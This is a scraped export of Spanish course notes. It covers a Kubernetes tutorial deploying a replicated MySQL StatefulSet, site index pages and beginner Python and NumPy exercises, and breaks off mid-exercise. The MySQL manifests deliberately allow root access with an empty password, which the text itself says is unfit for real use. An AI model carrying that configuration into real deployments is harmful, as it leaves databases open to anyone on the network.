ports:\n  - name: mysql\n    port: 3306\n  selector:\n    app: mysql\n\nkubectl apply -f servicios.yaml\n\nY ya por último creamos el StatefulSet, que en este caso es el objeto más complicado que vamos a ver en este curso. Veamos los elementos que utiliza:\n\nEstá formado inicialmente por tres pods, de los que en el primero se ejecutará el servidor MySQL primario y en los otros dos los servidores MySQL secundarios.\nSe define un volumen de 10 GiB para cada pod a través de un volumeClaim.\nUtiliza dos contenedores en cada pod, el principal que se encarga de ejecutar el proceso mysql y uno adicional que se encarga de la sincronización de la base de datos mediante XtraBackup. Ambos contenedores deben poder acceder al mismo volumen en el que se encuentra la base de datos, en el punto de montaje /var/lib/mysql.\nUtiliza InitContainers que no hemos visto en el curso; estos contenedores se ejecutan dentro del pod antes del contenedor normal y se utilizan para realizar configuraciones o modificaciones previas a la utilización del contenedor que va a ejecutar la aplicación. Una vez que el InitContainer ha finalizado se lanza el contenedor normal. En este caso se utilizan para la configuración inicial del contenedor mysql mediante un script que se lanza como un comando (si el índice es 0 configura el contenedor como primario y si es otro número, lo hace como secundario). El otro InitContainer se utiliza para clonar inicialmente la base de datos en los secundarios con xtrabackup.\nSe establece límite de consumo de recursos y se definen las pruebas de disponibilidad para que Kubernetes pueda comprobar si se está ofreciendo el servicio de forma adecuada.\nSe define el acceso a la base de datos sin contraseña, lo que hace que el sistema no sea válido para un despliegue real.\n\nstatefulset.yaml\napiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: mysql\nspec:\n  selector:\n    matchLabels:\n      app: mysql\n  serviceName: mysql\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: mysql\n    spec:\n      initContainers:\n      - name: init-mysql\n        image: mysql:5.7\n        command:\n        - bash\n        - &quot;-c&quot;\n        - |\n          set -ex\n          # Numera los servidores en función del índice del pod\n          [[ `hostname` =~ -([0-9]+)$ ]] || exit 1\n          ordinal=${BASH_REMATCH[1]}\n          echo [mysqld] &gt; /mnt/conf.d/server-id.cnf\n          # Establece el número del servidor a partir de 100\n          echo server-id=$((100 + $ordinal)) &gt;&gt; /mnt/conf.d/server-id.cnf\n          # Modifica MySQL con el ConfigMap en función de si es el primario (0) o no\n          if [[ $ordinal -eq 0 ]]; then\n            cp /mnt/config-map/primary.cnf /mnt/conf.d/\n          else\n            cp /mnt/config-map/replica.cnf /mnt/conf.d/\n          fi\n        volumeMounts:\n        - name: conf\n          mountPath: /mnt/conf.d\n        - name: config-map\n          mountPath: /mnt/config-map\n      - name: clone-mysql\n        image: gcr.io/google-samples/xtrabackup:1.0\n        command:\n        - bash\n        - &quot;-c&quot;\n        - |\n          set -ex\n          # No clona si ya existen datos.\n          [[ -d /var/lib/mysql/mysql ]] &amp;&amp; exit 0\n          # No clona si se trata del primario.\n          [[ `hostname` =~ -([0-9]+)$ ]] || exit 1\n          ordinal=${BASH_REMATCH[1]}\n          [[ $ordinal -eq 0 ]] &amp;&amp; exit 0\n          # Clona los datos del pod inmediatamente anterior\n          ncat --recv-only mysql-$(($ordinal-1)).mysql 3307 | xbstream -x -C /var/lib/mysql\n          # Prepara la copia de seguridad\n          xtrabackup --prepare --target-dir=/var/lib/mysql\n        volumeMounts:\n        - name: data\n          mountPath: /var/lib/mysql\n          subPath: mysql\n        - name: conf\n          mountPath: /etc/mysql/conf.d\n      containers:\n      - name: mysql\n        image: mysql:5.7\n        env:\n        - name: MYSQL_ALLOW_EMPTY_PASSWORD\n          value: &quot;1&quot;\n        ports:\n        - name: mysql\n          containerPort: 3306\n        volumeMounts:\n        - name: data\n          mountPath: /var/lib/mysql\n          subPath: mysql\n        - name: conf\n          mountPath: /etc/mysql/conf.d\n        resources:\n          requests:\n            cpu: 200m\n            memory: 1Gi\n        livenessProbe:\n          exec:\n            command: [&quot;mysqladmin&quot;, &quot;ping&quot;]\n          initialDelaySeconds: 30\n          periodSeconds: 10\n          timeoutSeconds: 5\n        readinessProbe:\n          exec:\n            # Comprueba si se pueden hacer consultas sobre TCP\n            command: [&quot;mysql&quot;, &quot;-h&quot;, &quot;127.0.0.1&quot;, &quot;-e&quot;, &quot;SELECT 1&quot;]\n          initialDelaySeconds: 5\n          periodSeconds: 2\n          timeoutSeconds: 1\n      - name: xtrabackup\n        image: gcr.io/google-samples/xtrabackup:1.0\n        ports:\n        - name: xtrabackup\n          containerPort: 3307\n        command:\n        - bash\n        - &quot;-c&quot;\n        - |\n          set -ex\n          cd /var/lib/mysql\n\n          # Determina la posición de log a clonar.\n          if [[ -f xtrabackup_slave_info &amp;&amp; &quot;x$(&lt;xtrabackup_slave_info)&quot; != &quot;x&quot; ]]; then\n            # Modificaciones previas\n            cat xtrabackup_slave_info | sed -E &#039;s/;$//g&#039; &gt; change_master_to.sql.in\n            rm -f xtrabackup_slave_info xtrabackup_binlog_info\n          elif [[ -f xtrabackup_binlog_info ]]; then\n            # Si existe xtrabackup_binlog_info, estamos clonando desde el primario\n            [[ `cat xtrabackup_binlog_info` =~ ^(.*?)[[:space:]]+(.*?)$ ]] || exit 1\n            rm -f xtrabackup_binlog_info xtrabackup_slave_info\n            echo &quot;CHANGE MASTER TO MASTER_LOG_FILE=&#039;${BASH_REMATCH[1]}&#039;,\\\n                  MASTER_LOG_POS=${BASH_REMATCH[2]}&quot; &gt; change_master_to.sql.in\n          fi\n\n          # Se comprueba si es necesaria completar un clon iniciando la replicación.\n          if [[ -f change_master_to.sql.in ]]; then\n            echo &quot;Esperando a que mysqld esté disponible&quot;\n            until mysql -h 127.0.0.1 -e &quot;SELECT 1&quot;; do sleep 1; done\n\n            echo &quot;Inicializando la réplica desde la última modificación&quot;\n            mysql -h 127.0.0.1 \\\n                  -e &quot;$(&lt;change_master_to.sql.in), \\\n                          MASTER_HOST=&#039;mysql-0.mysql&#039;, \\\n                          MASTER_USER=&#039;root&#039;, \\\n                          MASTER_PASSWORD=&#039;&#039;, \\\n                          MASTER_CONNECT_RETRY=10; \\\n                        START SLAVE;&quot; || exit 1\n            # En caso de que el contenedor se reinicie, se intenta de nuevo.\n            mv change_master_to.sql.in change_master_to.sql.orig\n          fi\n\n          # Lanza un servidor que pueda mandar copias solicitadas por otros.\n          exec ncat --listen --keep-open --send-only --max-conns=1 3307 -c \\\n            &quot;xtrabackup --backup --slave-info --stream=xbstream --host=127.0.0.1 --user=root&quot;\n        volumeMounts:\n        - name: data\n          mountPath: /var/lib/mysql\n          subPath: mysql\n        - name: conf\n          mountPath: /etc/mysql/conf.d\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n      volumes:\n      - name: conf\n        emptyDir: {}\n      - name: config-map\n        configMap:\n          name: mysql\n  volumeClaimTemplates:\n  - metadata:\n      name: data\n    spec:\n      accessModes: [&quot;ReadWriteOnce&quot;]\n      resources:\n        requests:\n          storage: 10Gi\n\nkubectl apply -f statefulset.yaml\n\nPodemos ir comprobando con kubectl cómo se van creando los diferentes pods y contenedores, tanto los InitContainers como los contenedores de cada pod y al tratarse de un StatefulSet, los pods no se crean en paralelo, lo hacen de manera secuencial (algo fundamental en este caso, ya que hasta que no ha terminado el primer pod que contiene el contendor primario, no deben lanzarse los secundarios).\nPrueba de funcionamiento de la base de datos\n\nCreamos un pod efímero con un cliente de MySQL para crear una tabla con un registro en el pod mysql-0 (con nombre DNS mysql-0.mysql):\n\nkubectl run mysql-client --image=mysql:5.7 -i --rm --restart=Never --\\\n  mysql -h mysql-0.mysql &lt;&lt;EOF\nCREATE DATABASE prueba;\nCREATE TABLE prueba.saludos (mensaje VARCHAR(250));\nINSERT INTO prueba.saludos VALUES (&#039;Bienvenidos al curso del CEP de k8s&#039;);\nEOF\n\n\nUna vez realizada la modificación en la base de datos, se eliminará el pod con el cliente MySQL. Creamos a continuación otro pod que realizará una consulta a la base de datos, pero lo hará a mysql-read con lo que comprobaremos que se ha realizado la sincronización a los secundarios:\n\nkubectl run mysql-client --image=mysql:5.7 -i -t --rm --restart=Never --\\\n  mysql -h mysql-read -e &quot;SELECT * FROM prueba.saludos&quot;\n\n\nPodemos comprobar los servidores que responden a una consulta a mysql-read solicitando el identificador del servidor en unas cuantas iteraciones, para lo que ejecutamos de forma interactiva una consulta repetidas veces para que se muestre el id del servidor que está respondiendo y así se vea el balanceo sobre todos los nodos:\n\nkubectl run mysql-client-loop --image=mysql:5.7 bash\n\n\nfor i in `seq 1 10`; do mysql -h mysql-read -e &#039;SELECT @@server_id,NOW()&#039;; sleep 1; done&quot;\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/index":{"title":"index","links":["DAW/Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.0-introduccion-a-kubernetes","DAW/Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.1-implantacion-de-aplicaciones-web-en-contenedores","DAW/Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.2-docker","DAW/Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.3-orquestadores-de-contenedores","DAW/Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.4-el-proyecto-kubernetes","DAW/Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.5-arquitectura-basica-de-kubernetes","DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.0-instalacion-de-kubernetes","DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.1-alternativas-para-instalacion-simple-de-k8s","DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.2-introduccion-a-la-instalacion-de-minikube","DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.3-instalacion-de-minikube-en-linux-con-kvm-virtualbox","DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.4-instalacion-de-minikube-en-windows-+-virtualbox","DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.5-instalacion-y-configuracion-de-kubectl-en-linux","DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.6-instalacion-y-configuracion-de-kubectl-en-windows","DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.7-despliegues-de-aplicaciones-en-kubernetes","DAW/Despliegue-de-aplicaciones-web/kubernetes/3.-contenedores-en-kubernetes-pods/3.0-contenedores-en-kubernetes","DAW/Despliegue-de-aplicaciones-web/kubernetes/3.-contenedores-en-kubernetes-pods/3.1-describiendo-un-pod","DAW/Despliegue-de-aplicaciones-web/kubernetes/3.-contenedores-en-kubernetes-pods/3.2-gestionando-los-pods","DAW/Despliegue-de-aplicaciones-web/kubernetes/4.-tolerancia-y-escalabilidad-replicasets/4.0-tolerancia-y-escalabilidad","DAW/Despliegue-de-aplicaciones-web/kubernetes/4.-tolerancia-y-escalabilidad-replicasets/4.1-describiendo-un-replicaset","DAW/Despliegue-de-aplicaciones-web/kubernetes/4.-tolerancia-y-escalabilidad-replicasets/4.2-gestionando-los-replicaset","DAW/Despliegue-de-aplicaciones-web/kubernetes/5.-despliegues-deployments/5.0-deployments","DAW/Despliegue-de-aplicaciones-web/kubernetes/5.-despliegues-deployments/5.1-describiendo-un-deployment","DAW/Despliegue-de-aplicaciones-web/kubernetes/5.-despliegues-deployments/5.2-gestion-basica-de-un-deployment","DAW/Despliegue-de-aplicaciones-web/kubernetes/5.-despliegues-deployments/5.3-actualizacion-y-desactualizacion-de-un-deployment","DAW/Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.0-acceso-a-las-aplicaciones","DAW/Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.1-describiendo-services","DAW/Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.2-gestionando-los-services","DAW/Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.3-servicio-dns-en-kubernetes","DAW/Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.4-ingress-controller","DAW/Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.5-ejemplo-completo-aplicacion-de-temperaturas","DAW/Despliegue-de-aplicaciones-web/kubernetes/7.-despliegues-parametrizados/7.0-despliegue-parametrizados","DAW/Despliegue-de-aplicaciones-web/kubernetes/7.-despliegues-parametrizados/7.1-variables-de-entorno","DAW/Despliegue-de-aplicaciones-web/kubernetes/7.-despliegues-parametrizados/7.2-configmaps","DAW/Despliegue-de-aplicaciones-web/kubernetes/7.-despliegues-parametrizados/7.3-secrets","DAW/Despliegue-de-aplicaciones-web/kubernetes/7.-despliegues-parametrizados/7.4-ejemplo-completo-despliegue-y-acceso-a-wordpress-+-mariadb","DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/8.0-almacenamiento-en-kubernetes","DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/8.1-volumenes-en-kubernetes","DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/8.2-aprovisionamiento-de-volumenes","DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/8.3-solicitud-de-volumenes","DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/8.4-uso-de-volumenes","DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/ejemplo-1-gestion-estatica-de-volumenes","DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/ejemplo-2-gestion-dinamica-de-volumenes","DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/ejemplo-3-wordpress-con-almacenamiento-persistente","DAW/Despliegue-de-aplicaciones-web/kubernetes/9.-otras-cargas-de-trabajo/9.0-otras-cargas-de-trabajo","DAW/Despliegue-de-aplicaciones-web/kubernetes/9.-otras-cargas-de-trabajo/9.1-statefulsets","DAW/Despliegue-de-aplicaciones-web/kubernetes/9.-otras-cargas-de-trabajo/9.2-daemonsets","DAW/Despliegue-de-aplicaciones-web/kubernetes/9.-otras-cargas-de-trabajo/9.3-jobs-y-cronjobs","DAW/Despliegue-de-aplicaciones-web/kubernetes/9.-otras-cargas-de-trabajo/ejemplo-despliegue-de-un-cluster-con-mysql","DAW/Despliegue-de-aplicaciones-web/kubernetes/10.-instalacion-de-aplicaciones-en-kubernetes-con-helm/10.0-instalacion-de-aplicaciones-en-kubernetes-con-helm","DAW/Despliegue-de-aplicaciones-web/kubernetes/10.-instalacion-de-aplicaciones-en-kubernetes-con-helm/10.1-instalacion-de-helm","DAW/Despliegue-de-aplicaciones-web/kubernetes/10.-instalacion-de-aplicaciones-en-kubernetes-con-helm/10.2-gestion-de-charts-y-despliegue-de-aplicaciones"],"tags":[],"content":"Kubernetes\nApuntes sobre Kubernetes\n\n1.0-introduccion-a-kubernetes\n\n1.1-implantacion-de-aplicaciones-web-en-contenedores\n1.2-docker\n1.3-orquestadores-de-contenedores\n1.4-el-proyecto-kubernetes\n1.5-arquitectura-basica-de-kubernetes\n\n\n2.0-instalacion-de-kubernetes\n\n2.1-alternativas-para-instalacion-simple-de-k8s\n2.2-introduccion-a-la-instalacion-de-minikube\n2.3-instalacion-de-minikube-en-linux-con-kvm-virtualbox\n2.4-instalacion-de-minikube-en-windows-+-virtualbox\n2.5-instalacion-y-configuracion-de-kubectl-en-linux\n2.6-instalacion-y-configuracion-de-kubectl-en-windows\n2.7-despliegues-de-aplicaciones-en-kubernetes\n\n\n3.0-contenedores-en-kubernetes\n\n3.1-describiendo-un-pod\n3.2-gestionando-los-pods\n\n\n4.0-tolerancia-y-escalabilidad\n\n4.1-describiendo-un-replicaset\n4.2-gestionando-los-replicaset\n\n\n5.0-deployments\n\n5.1-describiendo-un-deployment\n5.2-gestion-basica-de-un-deployment\n5.3-actualizacion-y-desactualizacion-de-un-deployment\n\n\n6.0-acceso-a-las-aplicaciones\n\n6.1-describiendo-services\n6.2-gestionando-los-services\n6.3-servicio-dns-en-kubernetes\n6.4-ingress-controller\n6.5-ejemplo-completo-aplicacion-de-temperaturas\n\n\n7.0-despliegue-parametrizados\n\n7.1-variables-de-entorno\n7.2-configmaps\n7.3-secrets\n7.4-ejemplo-completo-despliegue-y-acceso-a-wordpress-+-mariadb\n\n\n8.0-almacenamiento-en-kubernetes\n\n8.1-volumenes-en-kubernetes\n8.2-aprovisionamiento-de-volumenes\n8.3-solicitud-de-volumenes\n8.4-uso-de-volumenes\nejemplo-1-gestion-estatica-de-volumenes\nejemplo-2-gestion-dinamica-de-volumenes\nejemplo-3-wordpress-con-almacenamiento-persistente\n\n\n9.0-otras-cargas-de-trabajo\n\n9.1-statefulsets\n9.2-daemonsets\n9.3-jobs-y-cronjobs\nejemplo-despliegue-de-un-cluster-con-mysql\n\n\n10.0-instalacion-de-aplicaciones-en-kubernetes-con-helm\n\n10.1-instalacion-de-helm\n10.2-gestion-de-charts-y-despliegue-de-aplicaciones\n\n\n\nMateriales desarrollados por: Alberto Molina Coballes y José Domingo Muñoz Rodríguez\nPropiedad de la Consejería de Educación y Deporte de la Junta de Andalucía\nBajo licencia: Creative Commons CC BY-NC-SA"},"DAW/Despliegue-de-aplicaciones-web/ra-criterios-contenidos-practicas":{"title":"ra-criterios-contenidos-practicas","links":[],"tags":[],"content":"Intro a redes: tryhackme.com/r/room/whatisnetworking"},"DAW/index":{"title":"DAW","links":["DAW/Despliegue-de-aplicaciones-web/","DAW/Desarrollo-web-entorno-cliente/","DAW/Bases-de-datos/","DAW/Entornos-de-desarrollo/"],"tags":["DAW","Apuntes"],"content":"\n\n                  \n                  Warning\n                  \n                \n\nEsto es un trabajo en curso. Aún en una fase alfa.\n\n\nMateriales preparados para el Ciclo Formativo de Grado Superior de Desarrollo de Aplicaciones Web (DAW)\nInformación:\n\nwww.todofp.es/que-estudiar/familias-profesionales/informatica-comunicaciones/des-aplicaciones-web.html\n\nTemario de cada módulo profesional:\n\nDespliegue de Aplicaciones Web: DAWeb\nDesarrollo Web Entorno Cliente: DWEC\nBases de Datos: BBDD\nEntornos de Desarrollo: ED\n"},"FP-Dual/Normativa":{"title":"FP Dual Andalucía","links":["FP-Dual/240626_Instrucciones_DGFP_Andalucia.pdf","FP-Dual/241112_Guia_Organizacion_FFEOE.pdf","FP-Dual/241112_PRESENTACION_Guia_v014.pdf","FP-Dual/Modelo-solicitud-falta-puesto-formativos(F).pdf","FP-Dual/Preguntas_Implantación-nueva-FP_2024_25.pdf"],"tags":["FP","Dual","Normativa","Andalucía"],"content":"\n\n                  \n                  Warning\n                  \n                \n\nEsto es un trabajo en curso. Aún en una fase alfa.\n\n\nRecopilación de distintas normativas:\n\n240626_Instrucciones_DGFP_Andalucia.pdf\n241112_Guia_Organizacion_FFEOE.pdf\n241112_PRESENTACION_Guia_v014.pdf\nModelo solicitud falta puesto formativos(F).pdf\nPreguntas_Implantación nueva FP_2024_25.pdf\n"},"FP-Dual/index":{"title":"FP Dual Andalucía","links":["FP-Dual/240626_Instrucciones_DGFP_Andalucia.pdf","FP-Dual/241112_Guia_Organizacion_FFEOE.pdf","FP-Dual/241112_PRESENTACION_Guia_v014.pdf","FP-Dual/Modelo-solicitud-falta-puesto-formativos(F).pdf","FP-Dual/Preguntas_Implantación-nueva-FP_2024_25.pdf"],"tags":["FP","Dual","Normativa","Andalucía"],"content":"\n\n                  \n                  Warning\n                  \n                \n\nEsto es un trabajo en curso. Aún en una fase alfa.\n\n\nRecopilación de distintas normativas:\n\n240626_Instrucciones_DGFP_Andalucia.pdf\n241112_Guia_Organizacion_FFEOE.pdf\n241112_PRESENTACION_Guia_v014.pdf\nModelo solicitud falta puesto formativos(F).pdf\nPreguntas_Implantación nueva FP_2024_25.pdf\n"},"Python--and--Machine-learning/Python---webs-para-aprender":{"title":"Python - webs para aprender","links":[],"tags":[],"content":"\nprogramming-23.mooc.fi/\nwww.w3schools.com/python/\n"},"Python--and--Machine-learning/Python-ejercicios-1":{"title":"Python ejercicios 1","links":[],"tags":[],"content":"1. Variables y Tipos de Datos\nEjercicio 1.1 (Variables y Strings):\n\nCrea una variable llamada nombre_usuario y asígnale tu nombre como un string.\nCrea otra variable mensaje_bienvenida que contenga el string “Bienvenido al sistema, “.\nImprime por pantalla la concatenación del mensaje de bienvenida y el nombre de usuario.\nConcepto: Variables, Strings, Concatenación, print().\n\nEjercicio 1.2 (Números y Booleanos):\n\nCrea una variable intentos_login y asígnale el valor entero 3.\nCrea una variable max_intentos y asígnale el valor 5.\nCrea una variable booleana sesion_activa y asígnale False.\nImprime el tipo de cada una de estas variables usando la función type().\nConcepto: Variables, Integers, Booleans, type().\n\nEjercicio 1.3 (Listas):\n\nCrea una lista llamada ips_permitidas que contenga las siguientes direcciones IP (como strings): “192.168.1.1”, “10.0.0.5”, “8.8.8.8”.\nImprime la lista completa.\nImprime el segundo elemento de la lista (recordar que el índice empieza en 0).\nAñade la IP “192.168.1.100” al final de la lista.\nImprime la lista modificada.\nConcepto: Listas (creación, acceso por índice, añadir elementos con append()).\n\nEjercicio 1.4 (Diccionarios):\n\nCrea un diccionario llamado permisos_usuario donde las claves sean nombres de usuario (strings) y los valores sean sus roles (strings). Ejemplo: {&quot;admin&quot;: &quot;superuser&quot;, &quot;invitado&quot;: &quot;lectura&quot;, &quot;auditor&quot;: &quot;lectura_logs&quot;}.\nImprime el diccionario completo.\nImprime el rol del usuario “admin”.\nAñade un nuevo usuario “desarrollador” con el rol “escritura”.\nImprime el diccionario actualizado.\nConcepto: Diccionarios (creación, acceso por clave, añadir elementos).\n\n2. Operadores\nEjercicio 2.1 (Aritméticos y Comparación):\n\nUsando las variables intentos_login y max_intentos del ejercicio 1.2, calcula cuántos intentos quedan (intentos_restantes = max_intentos - intentos_login). Imprime el resultado.\nVerifica si intentos_login es menor que max_intentos. Imprime el resultado (debería ser True o False).\nVerifica si el nombre_usuario (del ejercicio 1.1, asegúrate de que esté definido) es exactamente igual a “admin”. Imprime el resultado.\nConcepto: Operadores aritméticos (-), Operadores de comparación (&lt;, ==).\n\nEjercicio 2.2 (Lógicos):\n\nCrea dos variables booleanas: usuario_valido = True y password_correcto = False.\nVerifica si el usuario es válido Y la contraseña es correcta. Imprime el resultado.\nVerifica si el usuario es válido O la contraseña es correcta. Imprime el resultado.\nVerifica si el usuario NO es válido. Imprime el resultado.\nConcepto: Operadores lógicos (and, or, not).\n\n3. Estructuras de Control: Condicionales (if, elif, else)\nEjercicio 3.1 (Comprobación Simple):\n\nPide al usuario que introduzca una contraseña usando input(&quot;Introduce tu contraseña: &quot;). Guarda la entrada en una variable password_introducida.\nComprueba si la longitud (número de caracteres) de password_introducida es menor que 8.\nSi es menor que 8, imprime “Contraseña demasiado corta. Debe tener al menos 8 caracteres.”\nSi no (es decir, si es 8 o más), imprime “Longitud de contraseña aceptable.”\nConcepto: input(), len(), if...else.\n\nEjercicio 3.2 (Múltiples Condiciones):\n\nUsando la password_introducida del ejercicio anterior (puedes pedirla de nuevo o reutilizar la variable si estás ejecutando secuencialmente):\n\nSi la longitud es menor que 8, imprime “Contraseña DÉBIL”.\nSi la longitud está entre 8 y 12 (inclusive), imprime “Contraseña MEDIA”.\nSi la longitud es mayor que 12, imprime “Contraseña FUERTE”.\nConcepto: if...elif...else, operadores de comparación (&lt;, &gt;=, &lt;=, &gt;).\n\n\n\nEjercicio 3.3 (Pertenencia):\n\nPide al usuario que introduzca su dirección IP usando input().\nUsando la lista ips_permitidas del ejercicio 1.3 (asegúrate de que esté definida), comprueba si la IP introducida está en la lista.\nSi está en la lista, imprime “Acceso permitido.”\nSi no está en la lista, imprime “Acceso denegado.”\nConcepto: in operator with lists, if...else.\n\nips_permitidas = [&quot;192.168.1.1&quot;, &quot;10.0.0.5&quot;, &quot;8.8.8.8&quot;, &quot;192.168.1.100&quot;]\n4. Estructuras de Control: Bucles (for, while)\nEjercicio 4.1 (for con Listas):\n\nItera sobre la lista ips_permitidas (asegúrate de que esté definida).\nDentro del bucle, imprime cada dirección IP precedida por “Verificando IP: “.\nConcepto: Bucle for para iterar sobre listas.\n\nips_permitidas = [&quot;192.168.1.1&quot;, &quot;10.0.0.5&quot;, &quot;8.8.8.8&quot;, &quot;192.168.1.100&quot;] \nEjercicio 4.2 (for con range):\n\nUsa un bucle for y la función range() para imprimir los números del 1 al 5 (inclusive).\nConcepto: Bucle for, range().\n\nEjercicio 4.3 (while):\n\nSimula un contador de intentos de acceso. Inicializa una variable intentos a 0.\nUsa un bucle while que se ejecute mientras intentos sea menor que 3.\nDentro del bucle, imprime “Intento número X” (sustituyendo X por el número de intento actual, empezando desde 1).\nIncrementa la variable intentos en 1 en cada iteración.\nAl salir del bucle, imprime “Número máximo de intentos alcanzado.”\nConcepto: Bucle while, contadores, incremento.\n\n5. Funciones\nEjercicio 5.1 (Función Simple):\n\nDefine una función llamada saludar_usuario que tome un argumento nombre.\nDentro de la función, debe imprimir “Hola, [nombre]! Bienvenido/a.”.\nLlama a la función pasándole tu nombre.\nConcepto: Definición de funciones (def), argumentos, llamadas a funciones.\n\nEjercicio 5.2 (Función con Retorno):\n\nDefine una función llamada es_longitud_segura que tome un argumento password.\nLa función debe devolver True si la longitud del password es 8 o más, y False en caso contrario.\nLlama a la función con diferentes contraseñas (ej. “12345”, “claveSegura123”) y guarda el resultado en una variable. Imprime esa variable para ver el resultado.\n\nEjercicio 5.3 (Función con Bucle y Lista):\n\nDefine una función llamada verificar_ip que tome dos argumentos: ip_a_verificar (un string) y lista_ips (una lista).\nDentro de la función, usa un bucle for para recorrer lista_ips.\nSi ip_a_verificar se encuentra en lista_ips, la función debe devolver True inmediatamente.\nSi el bucle termina sin encontrar la IP, la función debe devolver False (fuera del bucle).\nLlama a la función usando la lista ips_permitidas y prueba con una IP que esté en la lista (“10.0.0.5”) y otra que no (“1.1.1.1”). Imprime los resultados.\nConcepto: return statement, funciones que devuelven booleanos.\n\nEjercicio 5.3 (Función con Bucle y Lista):\n\nDefine una función llamada verificar_ip que tome dos argumentos: ip_a_verificar (un string) y lista_ips (una lista).\nDentro de la función, usa un bucle for para recorrer lista_ips.\nSi ip_a_verificar se encuentra en lista_ips, la función debe devolver True inmediatamente.\nSi el bucle termina sin encontrar la IP, la función debe devolver False (fuera del bucle).\nLlama a la función usando la lista ips_permitidas y prueba con una IP que esté en la lista (“10.0.0.5”) y otra que no (“1.1.1.1”). Imprime los resultados.\nConcepto: Combinar funciones, bucles, listas y return.\n\nips_permitidas = [&quot;192.168.1.1&quot;, &quot;10.0.0.5&quot;, &quot;8.8.8.8&quot;, &quot;192.168.1.100&quot;]\n6. Manejo de Errores Básico (try...except)\nEjercicio 6.1 (Entrada Numérica):\n\nPide al usuario que introduzca el número de días de validez de una contraseña (un entero) usando input().\nIntenta convertir la entrada a un entero usando int().\nUsa un bloque try...except ValueError para manejar el caso en que el usuario introduzca texto en lugar de un número.\nSi la conversión es exitosa, imprime “Número de días establecido: [número]“.\nSi ocurre un ValueError, imprime “Error: Debes introducir un número entero.”\n\nConcepto: try...except, ValueError, int().\n7. Entrada/Salida Básica (Archivos)\nEjercicio 7.1 (Escritura en Archivo):\n\nCrea una lista de strings llamada usuarios_bloqueados = [&quot;user1&quot;, &quot;test_user&quot;, &quot;guest&quot;].\nAbre un archivo llamado bloqueados.txt en modo escritura (&#039;w&#039;). Se recomienda usar with.\nUsa un bucle for para recorrer la lista usuarios_bloqueados.\nDentro del bucle, escribe cada nombre de usuario en el archivo, seguido de un salto de línea (\\n).\n\nConcepto: Abrir archivos (open()), modo escritura (&#039;w&#039;), escribir líneas (write()), saltos de línea (\\n), with statement.\nEjercicio 7.2 (Lectura de Archivo):\n\nAbre el archivo bloqueados.txt que creaste en el ejercicio anterior en modo lectura (&#039;r&#039;), usando with.\nLee todas las líneas del archivo usando readlines() y guárdalas en una nueva lista llamada leidos_desde_archivo.\nImprime la lista leidos_desde_archivo.\nOpcional Avanzado: Imprime la lista pero eliminando el \\n de cada elemento usando un bucle for y el método .strip().\n\nConcepto: Modo lectura (&#039;r&#039;), leer líneas (readlines()), with statement, método strip() (opcional)."},"Python--and--Machine-learning/Python-ejercicios-2":{"title":"Python ejercicios 2","links":[],"tags":[],"content":"Preparación: Importar Librerías\n# Importa las librerías necesarias\nimport numpy as np\nimport pandas as pd\nimport matplotlib.pyplot as plt\nimport seaborn as sns\nfrom io import StringIO # Para simular archivos CSV\n \n# Configuraciones opcionales para mejor visualización\n%matplotlib inline \npd.set_option(&#039;display.max_rows&#039;, 100) # Mostrar más filas si es necesario\nsns.set_style(&#039;whitegrid&#039;)\nParte 1: NumPy Básico\nEjercicio 1.1: Creación de Arrays\n\nCrea un array de NumPy llamado tiempos_respuesta a partir de la siguiente lista de Python, que representa tiempos de respuesta de un servidor en milisegundos: [120, 135, 128, 140, 150, 133, 122].\nCrea un array de NumPy llamado vulnerabilidades con 5 puntuaciones de criticidad (números flotantes) entre 0.0 y 10.0 (puedes inventarlos, ej: [7.5, 3.2, 8.9, 5.0, 9.8]).\nImprime ambos arrays y sus tipos (.dtype).\n\nEjercicio 1.2: Operaciones Vectorizadas\n\nConvierte los tiempos_respuesta (del ejercicio 1.1) de milisegundos a segundos dividiendo el array por 1000. Guarda el resultado en tiempos_respuesta_seg.\n“Normaliza” las puntuaciones de vulnerabilidades dividiendo cada puntuación por 10.0 (para que estén entre 0 y 1). Guarda el resultado en vulnerabilidades_norm.\nImprime los nuevos arrays.\n\ntiempos_respuesta = np.array([120, 135, 128, 140, 150, 133, 